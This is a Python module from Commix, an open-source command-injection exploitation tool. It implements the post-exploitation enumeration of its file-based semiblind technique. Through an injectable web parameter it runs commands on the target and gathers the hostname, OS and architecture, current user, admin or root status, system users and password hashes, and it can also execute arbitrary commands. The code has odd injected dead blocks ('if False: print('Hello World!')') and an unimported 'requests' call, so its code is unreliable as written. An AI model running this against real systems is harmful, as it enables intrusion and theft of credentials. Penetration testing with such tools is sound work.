"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2023 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""
import re
import sys
from src.utils import logs
from src.utils import menu
from src.utils import settings
from src.utils import session_handler
from src.core.injections.controller import checks
from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.injections.semiblind.techniques.file_based import fb_injector
'\nThe "file-based" technique on semiblind OS command injection.\n'
"\nPowershell's version number enumeration (for Windows OS)\n"

def powershell_version(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
    if False:
        for i in range(10):
            print('nop')
    _ = False
    cmd = settings.PS_VERSION
    if alter_shell:
        cmd = checks.escape_single_quoted_cmd(cmd)
    else:
        cmd = cmd = checks.quoted_cmd(cmd)
    if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        ps_version = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
        ps_version = ''.join((str(p) for p in ps_version))
        session_handler.store_cmd(url, cmd, ps_version, vuln_parameter)
    else:
        ps_version = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
    checks.print_ps_version(ps_version, filename, _)
'\nHostname enumeration\n'

def hostname(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
    if False:
        i = 10
        return i + 15
    _ = False
    if settings.TARGET_OS == settings.OS.WINDOWS:
        settings.HOSTNAME = settings.WIN_HOSTNAME
    cmd = settings.HOSTNAME
    if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
        shell = ''.join((str(p) for p in shell))
        session_handler.store_cmd(url, cmd, shell, vuln_parameter)
    else:
        shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
    checks.print_hostname(shell, filename, _)
'\nRetrieve system information\n'

def system_information(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
    if False:
        i = 10
        return i + 15
    _ = False
    if settings.TARGET_OS == settings.OS.WINDOWS:
        settings.RECOGNISE_OS = settings.WIN_RECOGNISE_OS
    cmd = settings.RECOGNISE_OS
    if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        target_os = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
        target_os = ''.join((str(p) for p in target_os))
        session_handler.store_cmd(url, cmd, target_os, vuln_parameter)
    else:
        target_os = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
    if target_os:
        target_os = ''.join((str(p) for p in target_os))
        if settings.TARGET_OS != settings.OS.WINDOWS:
            cmd = settings.DISTRO_INFO
            if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
                response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                if settings.URL_RELOAD:
                    response = requests.url_reload(url, timesec)
                distro_name = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
                distro_name = ''.join((str(p) for p in distro_name))
                if len(distro_name) != 0:
                    target_os = target_os + settings.SINGLE_WHITESPACE + distro_name
                session_handler.store_cmd(url, cmd, target_os, vuln_parameter)
            else:
                target_os = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
        if settings.TARGET_OS == settings.OS.WINDOWS:
            cmd = settings.WIN_RECOGNISE_HP
        else:
            cmd = settings.RECOGNISE_HP
        if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
            response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
            target_arch = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
            target_arch = ''.join((str(p) for p in target_arch))
            session_handler.store_cmd(url, cmd, target_arch, vuln_parameter)
        else:
            target_arch = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
    else:
        target_arch = None
    checks.print_os_info(target_os, target_arch, filename, _)
'\nThe current user enumeration\n'

def current_user(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
    if False:
        i = 10
        return i + 15
    _ = False
    if settings.TARGET_OS == settings.OS.WINDOWS:
        settings.CURRENT_USER = settings.WIN_CURRENT_USER
    cmd = settings.CURRENT_USER
    if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        cu_account = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
        cu_account = ''.join((str(p) for p in cu_account))
        session_handler.store_cmd(url, cmd, cu_account, vuln_parameter)
    else:
        cu_account = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
    checks.print_current_user(cu_account, filename, _)
'\nCheck if the current user has excessive privileges.\n'

def check_current_user_privs(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
    if False:
        for i in range(10):
            print('nop')
    _ = False
    if settings.TARGET_OS == settings.OS.WINDOWS:
        cmd = settings.IS_ADMIN
    else:
        cmd = settings.IS_ROOT
    if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
        shell = ''.join((str(p) for p in shell))
        session_handler.store_cmd(url, cmd, shell, vuln_parameter)
    else:
        shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
    checks.print_current_user_privs(shell, filename, _)
'\nSystem users enumeration\n'

def system_users(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
    if False:
        i = 10
        return i + 15
    _ = False
    cmd = settings.SYS_USERS
    if settings.TARGET_OS == settings.OS.WINDOWS:
        cmd = settings.WIN_SYS_USERS
        if alter_shell:
            cmd = checks.escape_single_quoted_cmd(cmd)
        else:
            cmd = checks.quoted_cmd(cmd)
    if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        sys_users = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
        sys_users = ''.join((str(p) for p in sys_users))
        session_handler.store_cmd(url, cmd, sys_users, vuln_parameter)
    else:
        sys_users = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
    checks.print_users(sys_users, filename, _, separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell)
'\nSystem passwords enumeration\n'

def system_passwords(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
    if False:
        print('Hello World!')
    _ = False
    cmd = settings.SYS_PASSES
    if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        sys_passes = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
        sys_passes = ''.join((str(p) for p in sys_passes))
        session_handler.store_cmd(url, cmd, sys_passes, vuln_parameter)
    else:
        sys_passes = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
    checks.print_passes(sys_passes, filename, _, alter_shell)
'\nSingle os-shell execution\n'

def single_os_cmd_exec(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
    if False:
        print('Hello World!')
    cmd = menu.options.os_cmd
    checks.print_enumenation().print_single_os_cmd_msg(cmd)
    if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
        shell = ''.join((str(p) for p in shell))
        session_handler.store_cmd(url, cmd, shell, vuln_parameter)
    else:
        shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
    checks.print_single_os_cmd(cmd, shell)
'\nCheck the defined options\n'

def do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
    if False:
        print('Hello World!')
    if not menu.options.ps_version and settings.TARGET_OS == settings.OS.WINDOWS:
        checks.ps_check()
    if menu.options.ps_version and settings.PS_ENABLED == None:
        if not checks.ps_incompatible_os():
            checks.print_enumenation().ps_version_msg()
            powershell_version(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
            settings.ENUMERATION_DONE = True
    if menu.options.hostname:
        checks.print_enumenation().hostname_msg()
        hostname(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        settings.ENUMERATION_DONE = True
    if menu.options.current_user:
        checks.print_enumenation().current_user_msg()
        current_user(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        settings.ENUMERATION_DONE = True
    if menu.options.is_root or menu.options.is_admin:
        checks.print_enumenation().check_privs_msg()
        check_current_user_privs(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        settings.ENUMERATION_DONE = True
    if menu.options.sys_info:
        checks.print_enumenation().os_info_msg()
        system_information(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        settings.ENUMERATION_DONE = True
    if menu.options.users:
        checks.print_enumenation().print_users_msg()
        system_users(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        settings.ENUMERATION_DONE = True
    if menu.options.passwords:
        if settings.TARGET_OS == settings.OS.WINDOWS:
            check_option = '--passwords'
            checks.unavailable_option(check_option)
        else:
            checks.print_enumenation().print_passes_msg()
            system_passwords(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        settings.ENUMERATION_DONE = True